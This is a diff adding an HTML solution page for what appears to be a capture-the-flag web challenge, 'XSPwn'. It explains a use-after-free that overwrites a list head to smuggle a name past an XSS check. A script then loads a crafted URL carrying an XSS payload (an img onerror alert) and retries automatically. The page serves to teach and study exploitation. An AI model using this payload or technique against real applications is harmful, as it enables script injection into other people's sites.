@@ -1,0 +1,53 @@
+<html>
+
+<head>
+  <style>
+    nav span {
+      padding-right: 10px;
+    }
+
+    body {
+      font-family: system, -apple-system, "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Helvetica", "Lucida Grande", "Arial", sans-serif;
+      padding: 0 10px;
+      line-height: 1.4;
+      font-size: 16px;
+      color: #111;
+    }
+
+    h1,
+    h2,
+    h3 {
+      line-height: 1.0;
+    }
+  </style>
+</head>
+
+<body style="margin: auto; max-width: 650px">
+  <div style="margin-top: 30px; height: 40px">
+    <h1 style="float: left; margin: 0; padding-right: 10px">XSPwn Solution</h1>
+  </div>
+  <hr>
+  <ol>
+    <li>Hit the maximum number of nodes, to trigger a node deletion.</li>
+    <li>When the first node is deleted, the memory taken by that node is freed with <code>free(curr)</code>but the <code>HEAD</code> is not updated.</li>
+    <li>Insert another node, overwriting <code>HEAD->name</code> in the next <code>malloc()</code> and <code>strcpy()</code></li>
+    <li>By overwriting with the correct memory address, we can point to a previous name that failed the XSS check.
+  </ol>
+  <p>
+    The solution works once in every 10 tries on average. The exploit will automatically retry until it works.
+  </p>
+  <p>
+    <a href="https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2022/web/xspwn/solve/solve.md"
+      target="_blank">Full Solution</a>
+    | <a href="/">Home</a>
+  </p>
+
+  <button onclick="exploit()">Run Expoit</button>
+  <iframe style="display: block; margin-top: 20px;" id="iframe"></iframe>
+  <script>
+    const exploit = () => {
+      document.getElementById('iframe').src = "/xspwn/?jareds=<img src=x onerror=alert(document.domain)>,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,%20%0e%50%00"
+      setTimeout(exploit, 1000)
+    }
+  </script>
+</body>
